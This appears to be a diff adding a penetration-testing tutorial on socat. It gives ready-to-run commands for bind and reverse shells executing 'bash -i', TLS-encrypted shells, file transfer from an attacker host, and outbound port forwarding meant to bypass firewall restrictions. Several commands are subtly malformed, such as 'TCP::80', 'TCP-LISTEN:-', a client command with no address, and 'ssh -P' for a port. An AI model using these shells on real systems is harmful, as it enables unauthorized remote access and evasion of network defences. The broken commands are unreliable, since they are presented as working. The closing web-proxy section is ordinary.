@@ -1,0 +1,148 @@
+
+Advanced socat
+
+socat is a general-purpose networking tool that allows the creation of two bidirectional streams. It has a large amount of support for different protocols and data sources, including OPENSSL, SOCKS4, TCP, UDP, TAP, SCTP and more. When performing a penetration test this tool can be leveraged to bypass basic firewall restrictions and transfer files across the network.
+Statically compiled socat
+
+There is a cool project called static-toolbox which provides statically compiled networking and debugging tools. This project includes a statically compiled versions of socat for x86/x86_64 and allows the tool to have a lot more portability between differing Linux distributions and major library versions for a small cost of ~2MB.
+Simple Listening Shell
+
+On the client run:
+
+socat TCP-LISTEN:8080 exec:"bash -i",pty,stderr,setsid,sigint,sane
+
+On the attacker machine run
+
+socat - TCP:$clientip:8080
+#or
+nc $clientip:8080
+
+This shell works great, but there are two obvious problems:
+
+    – The IP will be listening for any connection
+    – The firewall might block non-default ports (such as 8080)
+
+We can get around this by using the outbound technique that I will show later.
+Simple File Transfer
+
+There are two methods of doing file transfers:
+
+    – Opening a listening port and waiting for the file
+    – Opening a listening port to send the file
+
+Overall, the better of these two methods is when a client connects to a listening port to download a file, as this is less likely to be blocked by firewalls. To do this you need to run these two commands.
+
+On the attacker:
+
+socat file:secretfile TCP-LISTEN:8080
+
+On the client:
+
+socat TCP:$attackerip:8080 OPEN:/tmp/secretfile,create
+
+Encrypted Listening Shell
+
+We can generate an encrypted reverse shell with client and server keys to allow only our chosen attacker machine to connect to the server.
+
+# Find more detailed steps at:
+#   http://www.dest-unreach.org/socat/doc/socat-openssl.txt
+openssl genrsa -out server.key 2048
+openssl genrsa -out client.key 2048
+
+# IMPORTANT: When generating the server.crt it will 
+#   ask for a "commnonName", make sure this is the 
+#   same as your attacker's hostname!
+openssl req -new -key server.key -x509 -days 3653 -out server.crt
+openssl req -new -key client.key -x509 -days 3653 -out client.crt
+
+cat server.key server.crt > server.pem
+cat client.key client.crt > client.pem
+
+rm {server,client}.key
+
+chmod 600 server.pem client.pem
+
+#Server.pem is on the host.
+#Client.crt is on the host.
+#On the host run:
+socat OPENSSL-LISTEN:1443,reuseaddr,fork \
+                         ,cert=server.pem,cafile=client.crt,verify=1 \
+    exec:'bash -i',pty,stderr,setsid,sigint,sane
+
+#Server.crt is on the client
+#Client.pem is on the client.
+#On the client run:
+socat \
+    OPENSSL:localhost:1443,verify=1,cert=client.pem,cafile=server.crt -
+
+socat reverse shell
+
+Sometimes the network will be configured in such a way that only certain ports will be able to host a listening service, such as 80 and 443 on a web host for example. In this case, unless we have sudo privileges, establishing a listening shell with socat is not possible. To mitigate this we can instead forward a shell or service through an outbound connection. We can also establish a PTY shell in a similar fashion
+
+On the attacker machine run:
+
+sudo socat -d TCP-LISTEN:80 TCP-LISTEN:-
+
+On the client run:
+
+socat -d exec:"bash -i",pty,stderr,setsid,sigint,sane
+
+Forwarding a service through an outbound connection Sometimes we want to be able to access a local service on the machine, for example if we want to access the SSH service running on our host we need to be able to use the ssh command or to be able to use our browser to interact with a local web server. We can achieve this by instead creating a second listening port on the attacker machine that will allows our different programs to connect and interact with the client’s service. On the attacker machine we create two listening ports, it will wait for a connection from our client on port 80 and then wait for a suitable
+
+sudo socat -d TCP-LISTEN:80,fork,reuseaddr TCP-LISTEN:10023
+
+On the client run:
+
+socat -d TCP:localhost:22 TCP::80
+
+This will allow you to connect to the service (In this case SSH) by connecting to local port 10023.
+
+ssh root@localhost -P 10023
+#or
+curl http://localhost:10023
+
+socat encrypted reverse shell
+
+On the attacker machine we create a listening port, it will wait for a connection from our client on port 80 and then allow us to interact with it from stdin.
+
+sudo socat -d \
+    OPENSSL-LISTEN:80,reuseaddr,fork,\
+    cert=server.pem,cafile=client.crt,verify=1 -
+
+On the client machine we need to run:
+
+socat exec:"bash -i",pty,stderr,setsid,sigint,sane \
+      OPENSSL:localhost:80,verify=1,cert=client.pem,cafile=server.crt
+
+Forwarding a service through an encrypted outbound connection
+
+After following the key generation steps listed in the encrypted reverse shell section we can wrap our outbound reverse shell in openssl using the following commands.
+
+On the attacker machine we need to run:
+
+sudo socat -d \
+    OPENSSL-LISTEN:80,reuseaddr,fork,\
+    cert=server.pem,cafile=client.crt,verify=1 \
+    TCP-LISTEN:10023,reuseaddr,fork
+
+On the client machine we need to run:
+
+socat TCP:localhost:22 \
+      OPENSSL:localhost:80,verify=1,cert=client.pem,cafile=server.crt
+
+Finally, we can create a connection by running the final connect command on the attacker machine.
+
+ssh root@localhost -P 10023
+#or
+curl http://localhost:10023
+
+Forwarding packets through a web proxy with socat
+
+Sometimes a service or program will not allow the user to set a HTTP proxy. For example, if you wanted to inspect the HTTP connections a browser is making but the proxy settings are broken. The command to do so follows the general form:
+
+socat TCP-LISTEN:$lstport \
+    PROXY:$proxyip:$dstip:$dstport,proxyport=$proxyport
+
+socat TCP-LISTEN:8000 PROXY:localhost:google.com:80,proxyport=8080
+
+In your browser you would point to http://localhost:8000 and it would be redirected to the end server (http://google.com) through the proxy running on port 8080. This would allow you to set up BurpSuite and use it to inspect packets without having to set proxy configurations in the actual browser. This becomes especially applicable in reversing a programs protocol where it does not allow you to set a proxy.
